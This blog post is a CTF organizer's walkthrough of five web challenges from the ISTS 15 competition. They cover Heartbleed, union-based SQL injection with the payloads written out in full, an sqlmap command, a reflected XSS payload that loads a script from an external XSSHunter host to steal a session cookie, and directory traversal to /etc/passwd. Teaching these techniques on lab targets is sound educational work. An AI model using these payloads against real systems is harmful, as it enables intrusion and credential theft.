---
layout: post
title: ISTS 15 Web Challenges
---

This year, I had the awesome opportunity to serve as the organizer and team lead of the CTF within SPARSA's annual ISTS competition. This entailed managing a small team of 5 students as we created CTF challenges for each of the 5 CTF categories (Web, Reversing, Crypto, Forensics, and Misc). Besides gaining experience managing a team for the first time and planning and executing a project from conception to completion, I was also able to sharpen my technical skills by creating challenges.

I was in charge of the web category this year, and created 5 challenges that range from beginner to advanced level. This post walks through each of them, and explains the intended path that a player would take to arrive at the solution.

## 100

Web 100 (titled Layers) starts us off by presenting the user with a quote from the 2001 DreamWorks classic, Shrek.

![Shrek quote]({% link /resources/ists15/1.PNG %})

Inspecting the page's source reveals a series of layered divs, with a different background image for each.

![Series of divs in browser dev tools]({% link /resources/ists15/2.PNG %})

To reach the flag, the user can 'peel back' each layer by removing it from the DOM using the browser's dev tools.

![Removing layers of divs]({% link /resources/ists15/3.PNG %})

Reaching the bottommost image (`nineteen`) reveals the flag in the form of an animated GIF.

![Animated GIF flag]({% link /resources/ists15/4.PNG %})

## 200

The next challenge provides an HTTPS link to a surgical center with some... interesting procedures.

![Bleeding Heart Surgical Center]({% link /resources/ists15/5.PNG %})

Poking around the site reveals tons of sketchy medical procedures and questionable ethics, but little in terms of functionality or dynamic content.

![Would you trust them?]({% link /resources/ists15/6.PNG %})

Hint: The "Not secure" warning next to the address bar is telling the truth. The vulnerability lies in the web server's OpenSSL library -- the server is vulnerable to Heartbleed. This can be verified using a tool like nmap:

![nmap scan reveals Heartbleed vulnerability]({% link /resources/ists15/7.PNG %})

To exploit the bug, launch a simple PoC script against the target. I used this [GitHub gist](https://gist.github.com/sh1n0b1/10100394) and got the flag in the memory dump:

![Flag in Heartbleed memory dump]({% link /resources/ists15/8.PNG %})

## 300

Web 300 cuts right to the chase -- the user is instantly greeted with a form with bunch of inputs on a PHP endpoint.

![Web 300 homepage]({% link /resources/ists15/9.PNG %})

Submitting the form displays a horoscope that changes according to the user's birth date.

![Our endearing horoscope]({% link /resources/ists15/10.PNG %})

After poking at this for a while, one might think to try a SQL injection attack (shown below in Burp Suite Repeater). However, we quickly discover the application's defenses don't like that:

![No funny business!]({% link /resources/ists15/11.PNG %})

These defenses seem to hold true for both the `day` and `year` fields. Messing with the `month` is also frowned upon:

![Still no funny business!]({% link /resources/ists15/12.PNG %})

However, when we leave the original `month` name intact, but add some SQL injection probes after it, we get a different response.

![Funny business!]({% link /resources/ists15/13.PNG %})

Hmm... let's try a basic `' or 1=1;#` payload.

![No dice]({% link /resources/ists15/14.PNG %})

Looks like that doesn't get us very far. Maybe they're not using single quotes? Let's try it again, but with double quotes this time:

![Success!]({% link /resources/ists15/15.PNG %})

We got a response this time! It looks like the double quotes did it. So now we definitely know this is SQL injectable, and we need to try to extract the flag from it.

Let's try to enumerate the tables within the database with this handy SQL line from [PentestMonkey](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet):

`" union select table_schema,table_name from information_schema.tables where table_schema != 'mysql' and table_schema != 'information_schema';#`

![Command failed]({% link /resources/ists15/16.PNG %})

But alas, it appears this didn't work. If we look back at the normal output of the web app, we see the horoscope is the only thing being visibly returned from the database. Aha! Maybe the backend SQL code is only selecting a single column, where our injection is trying to select two? Let's try it again, but concatenate the `table_schema` and `table_name` this time:

`" union select concat(concat(table_schema, '.'), table_name) from information_schema.tables where table_schema != 'mysql' and table_schema != 'information_schema';#`

![We got a response!]({% link /resources/ists15/17.PNG %})

Sweet, that got us a response at least! So we fixed the columns, but we're still not getting the data we want -- the horoscope is still being returned. What could be the problem this time?

Let's take another look at our injection. We're using `union` to combine the results from two `select` statements: one from the original backend SQL code, and one that we're injecting to pull the table names. These results are lumped into one large return set with multiple rows, and the database is simply returning the first row, which is the horoscope.

To get around this, we can use SQL's `limit` and `offset` statements to select the exact row we want. Let's try grabbing the next row:

`" union select concat(concat(table_schema, '.'), table_name) from information_schema.tables where table_schema != 'mysql' and table_schema != 'information_schema' limit 1 offset 1;#`

![Success!]({% link /resources/ists15/18.PNG %})

Now we're cooking with gas! This looks like the table containing our flag. Let's take a look inside and list out the table's columns with the following injection:

`" union select column_name from information_schema.columns where table_schema = 'horoscopes' and table_name = 'flags' limit 1 offset 1;#`

![A column named flag]({% link /resources/ists15/19.PNG %})

A column named `flag`... this has gotta be it! Let's dump the `flag` column:

`" union select flag from horoscopes.flags limit 1 offset 1;#`

![Australia?!]({% link /resources/ists15/20.PNG %})

Huh?! This doesn't look like our flag format... let's try one more?

![This is odd...]({% link /resources/ists15/21.PNG %})

This can't be right... let's see what other columns exist within the `flags` table?

![Description]({% link /resources/ists15/22.PNG %})

A `description`! This might help us understand what's going on here. Let's see what's inside `description`:

![Fooled!]({% link /resources/ists15/23.PNG %})

A description of the Australian flag?!? You can't mean... AGH! We've been duped!! Foiled!

So it looks like this was a fake table designed to throw us off. Thankfully, we can return to an earlier injection and keep looking for tables within the database:

`" union select concat(concat(table_schema, '.'), table_name) from information_schema.tables where table_schema != 'mysql' and table_schema != 'information_schema' limit 1 offset 2;#`

![Horoscopes]({% link /resources/ists15/24.PNG %})

This looks like the database our horoscopes are pulled from. Let's try one more:

![private.flag]({% link /resources/ists15/25.PNG %})

Aha! This looks fruitful! Let's take a look at the columns:

![id]({% link /resources/ists15/26.PNG %})

An `id`... not of much use. Anything else?

![flag]({% link /resources/ists15/27.PNG %})

Just what the doctor ordered. Let's get this over with, shall we?

![Our flag!]({% link /resources/ists15/28.PNG %})

Note that it *is* possible to complete this challenge with SQLmap, but it's intentionally designed to be difficult to do so. The SQLmap command to pull the `private` database is:

`sqlmap --data='month=January&day=1&year=1999' --level=5 -u http://192.168.132.133/index.php --threads=4 -D private --dump`

The process of deriving that command is left as an exercise for the reader.

## 400

Our next challenge prompts us to get in touch with King Girugamesh via Facebook messenger. We shoot him a message, and he explains himself a bit (keep in mind the Civilization theme of the competition) and asks us to provide him a link on the challenge website.

![Girugamesh conversation]({% link /resources/ists15/29.PNG %})

The challenge website has a large map that the user can interact with. Clicking a country passes the country's ID as a query parameter, which loads the country's name on the page.

![Challenge website]({% link /resources/ists15/30.PNG %})

![Country loaded]({% link /resources/ists15/31.PNG %})

There's also a login link on top, and we can see that Girugamesh is currently logged in. Browsing to the login page loads a simple username/password form.

![Login form]({% link /resources/ists15/32.PNG %})

Trying some basic SQL injection doesn't seem to get us anything. We can even fire SQLmap at the login endpoint, and it comes up empty.

`sqlmap --data 'username=test&password=test' --level=5 -u http://192.168.132.145/login.php --threads=4`

![SQLmap error]({% link /resources/ists15/33.PNG %})

So now what? Let's go back to our homepage for right now. After poking around a bit, we discover that inputting an alphabetical country ID generates an error message on the map:

![Map error message]({% link /resources/ists15/34.PNG %})

That looks like user input being reflected back on the page! Perhaps this is vulnerable to XSS?

![XSS payload works]({% link /resources/ists15/35.PNG %})

Looks like it is! But what value does XSS have to us? We're trying to attack the server, not a user, right?

Let's revisit what we know so far. Girugamesh asked us for a link to the challenge website, and he's currently logged in... maybe we can leverage the XSS to steal his cookie and access the web app!

To help us accomplish this, we can use [XSSHunter](https://xsshunter.com/) to generate a payload that will report a ton of information back to us whenever the XSS fires, including the victim's cookies. Our new XSSHunter payload is:

`http://192.168.132.145/?<script src=https://dave.xss.ht></script>`

Let's send that over to Girugamesh!

![Looks like he doesn't like it]({% link /resources/ists15/36.PNG %})

Hmm... looks like he knows something's fishy here. We'll need to find a way to make the link less suspicious so Girugamesh will click it. He said something about the ID having words... maybe we can URL-encode it to get rid of them? After URL-encoding, our new payload is:

`http://192.168.132.145/?%3c%73%63%72%69%70%74%20%73%72%63%3d%68%74%74%70%73%3a%2f%2f%64%61%76%65%2e%78%73%73%2e%68%74%3e%3c%2f%73%63%72%69%70%74%3e`

Girugamesh happily clicks our link now, and the XSS payload fires! We can use the generated XSSHunter report to view information gathered from the attack, including his session cookie.

![He clicked it!]({% link /resources/ists15/37.PNG %})

Our XSSHunter report reveals a cookie named `flag` with a value of `... ..-. ..- --.. ..- - ...- -- ... - -. --.. ..- ..-. .-. .--- ..- -.-- -.-- ..- -.- .--.`. Is that... Morse code? Whatever, let's load it into our browser and see what the logged-in version of the page looks like.

![Welcome!]({% link /resources/ists15/38.PNG %})

All we get is a welcome message and a cheeky YouTube video. Perhaps the flag is within the Morse code itself? Running the cookie through a Morse code translator reveals the string `SFUZUTVMSTNZUFRJUYYUKP`, but this value is rejected when we try to enter it as a flag. There must be something else going on here!

Remember our login page? Maybe there's something there that can indicate how our cookie is generated. Taking a look at the login page source reveals an algorithm for generating the cookie client-side, which replaces our password and is sent to the server.

```javascript
function hash_password(pwField) {
	hash = pwField.value.toLowerCase().split('');

	caesarian_shift(hash, 13);
	rotate_right(hash, 37);
	swap_chars(hash, 'g', 'i');
	swap_chars(hash, 'r', 'u');
	swap_chars(hash, 'g', 'a');
	swap_chars(hash, 'm', 'e');
	swap_chars(hash, 's', 'h');
	hash = morse_code(hash);

	pwField.value = hash.join(' ').replace(/ +/g, ' ');
}
````

To get the original password (and the flag), it looks like we'll have to work backwards through this function to reverse this 'hashing' process:
1. Translate the Morse code
2. Replace all `H`'s with `S`'s
3. Replace all `E`'s with `M`'s
4. Replace all `A`'s with `G`'s
5. Replace all `U`'s with `R`'s
6. Replace all `I`'s with `G`'s
7. Left-rotate the array 37 times
8. Finally, perform a Caesarian shift with a key of 13 (26-13 = 13)

Reversing the algorithm reveals the original password `WELLEXCUSEMEGIRUGAMESH`. Entering this as our flag solves the challenge and takes us to the final round!

## 500

The final challenge brings us to an eccentrically-designed gym website, complete with flaming text and rippling biceps.

![House of Curl]({% link /resources/ists15/39.PNG %})

The page's source code is pretty bare -- it appears to be a simple static page. To verify, we can try requesting the index page to confirm its file type. Let's try .html, .htm, and .php for good measure:

![404]({% link /resources/ists15/40.PNG %})

![404]({% link /resources/ists15/41.PNG %})

No dice so far...

![PHP works]({% link /resources/ists15/42.PNG %})

.php did it! Now we know the site is dynamic -- there could be some server-side PHP code that checks some aspect of our request, and returns different pages depending on that aspect. After all, that message on the site seems pretty suspicious. Perhaps we need to provide the 'magic words'?

Let's take another look at the site. Given the name of the gym and the pictures on the page, they seem to focus pretty heavily on bicep curls. In fact, that's the only exercise on the entire website. Hmm, a web challenge with bicep curls... could they be referring to [cURL](https://curl.haxx.se/), the command-line tool?

Let's find out! When requesting the page with cURL, we get the following result:

![Different!]({% link /resources/ists15/43.PNG %})

Bingo! Requesting with cURL gives us a completely different output. Looks like Gilgamesh is trying to sell the stuff he stole from Girugamesh in the previous challenge. Let's check out these goods he's selling:

![Goods image gallery]({% link /resources/ists15/44.PNG %})

We're greeted by an image gallery of the miscellaneous items and services that constitute the latest 'Girugamesh loot'. Looking at the page source, something peculiar jumps out at us:

![Funky image retrieval]({% link /resources/ists15/45.PNG %})

All the images are retrieved dynamically from a PHP endpoint! It looks like we can specify the location of the image we want, and provide some sort of an access token as well.

Are you thinking what I'm thinking? Let's try to request something other than an image using a directory traversal attack! We can start with the classic /etc/passwd payload, and use the same access token as the images on the page:

![Not happening]({% link /resources/ists15/46.PNG %})

Hmm, it looks like there are some protections in place. The application must somehow detect that /etc/passwd isn't an image. If we look at the images on the page, all of their file paths begin with the `images` directory. Maybe if we start our directory traversal from `images`, we can evade the application's image checks?

![Invalid access token]({% link /resources/ists15/47.PNG %})

Sweet, we got some different output this time! Now it looks like our access token is the problem. The same token used for most of the images on the page doesn't seem to work for accessing /etc/passwd.

To understand what's going on, let's revisit the original access tokens on the page. The token `ffd8ffe0` is used for almost all of the images, with the exception of `ffd8ffe1`. These characters are all within the range of valid hexadecimal numbers. Maybe our access token is a certain 4-byte value in hex? Throwing our access token in a hex editor converts it to four random Unicode characters, which isn't too helpful:

![Random characters]({% link /resources/ists15/48.PNG %})

At this point we're pretty stumped. Let's try throwing the access code into Google to see what comes up:

![File signatures]({% link /resources/ists15/49.PNG %})

It looks like this is the [file signature](https://en.wikipedia.org/wiki/File_format#Magic_number) for JPEG images. Some more quick searching reveals `ffd8ffe1` is an alternative file signature for JPEGs with EXIF data. Could our access token simply be the file signature of the file we're requesting?

To test this, let's download two images from the page: `sub.JPG` with access token `ffd8ffe0`, and `mantle.jpg` with access token `ffd8ffe1`. Loading them into a hex editor, we see `sub.JPG` indeed begins with bytes `FF D8 FF E0`, and `mantle.jpg` begins with `FF D8 FF E1`.

![FF D8 FF E0]({% link /resources/ists15/50.PNG %})

![FF D8 FF E1]({% link /resources/ists15/51.PNG %})

Cool, so it looks like our hypothesis is correct! To access a file, we need to know its first 4 bytes. So for /etc/passwd, what would they be?

![root account]({% link /resources/ists15/52.PNG %})

/etc/passwd usually starts with the root account, which occupies the first 4 bytes. Typing `root` in our hex editor reveals the bytes `72 6F 6F 74`. Let's try that as our access token:

![Success!]({% link /resources/ists15/53.PNG %})

Awesome, that worked! So we know how to access arbitrary files on the web server, now we just need to find and pull the flag. However, this is easier said than done: the flag could be anywhere in the filesystem, and we don't have much indication of where to look.

To get a better idea of where to start, let's request the PHP file itself so we can see its code. We'll start in the images folder and traverse upward to access `viewimage.php`. Now we just need to guess the access code.

Similar to the /etc/passwd file, most PHP files start with a predictable 4 bytes. When the PHP interpreter parses a file, it looks for PHP opening and closing tags (`<?php` and `?>`) to know when to start and stop interpreting PHP code. Conveniently for us, this opening tag is usually located directly at the beginning of PHP files. Thus, our access code would be `<?ph`, or `3C 3F 70 68` in hex. Let's give it a try:

![Blank page]({% link /resources/ists15/54.PNG %})

What?! Nothing at all? No error message, even?

![Source code]({% link /resources/ists15/55.PNG %})

Phew, false alarm. It doesn't look like there's any information about the flag within the PHP code, but there's a comment with a link to a blog post on yet another site. Let's see what's on that page:

![Blog post]({% link /resources/ists15/56.PNG %})

Interesting... it looks like this is where Gilgamesh brags about his latest engineering 'accomplishments'. Another post on the site hints about his upcoming payment processing system that has yet to be released:

![duMass Payment Processor]({% link /resources/ists15/57.PNG %})

From this post, we can gather that the payment processor is written in PHP and the code is ready to be released. At the bottom of the blog, Gilgamesh links to some communities he's a member of, all of which are for WordPress plugin development:

![WordPress Plugin Developers]({% link /resources/ists15/58.PNG %})

This new payment processor may very well be a WordPress plugin. Let's check the plugin directory of his blog:

![duMass directory]({% link /resources/ists15/59.PNG %})

Aha! Just what we're looking for. Let's take a look inside:

![duMass files]({% link /resources/ists15/60.PNG %})

An HTML and a PHP file. Browsing to the PHP file triggers some sort of anti-tamper protection:

![Tampering detected!]({% link /resources/ists15/65.PNG %})

To understand how this PHP endpoint is used, let's look at the HTML file:

![HTML form]({% link /resources/ists15/61.PNG %})

Looks like a form that users submit when they want to purchase something. Filling it out and submitting it returns the following message from `process-payment.php`:

![How rude!]({% link /resources/ists15/62.PNG %})

Well that was rude! At least the anti-tamper protection wasn't triggered. And it looks like we're on a different IP now! Wait, is that the same IP from the Girugamap challenge? Let's take another look at that form:

![HTML source]({% link /resources/ists15/63.PNG %})

What's this?! It looks like the form's POST endpoint has been replaced. No way... Girugamesh backdoored the payment processor by redirecting the form to his site!! His endpoint is pretty rude though. I wonder what the original endpoint does?

The PHP file didn't like it when it was requested directly, but Girugamesh's seemed to run fine when we submitted data to it through the HTML form. To replicate this, we can use Chrome's Developer Tools to replace the backdoored endpoint with the original:

![Replaced with original endpoint]({% link /resources/ists15/64.png %})

Now let's submit the form and see what happens:

![A nicer message]({% link /resources/ists15/66.PNG %})

Ah, this is much friendlier. But still not very helpful! Wait a second, our open Developer Tools window caught something:

![The flag!]({% link /resources/ists15/67.PNG %})

Finally, we get the flag! Thus concludes this year's web challenges. Hopefully Gilgamesh learned his lesson!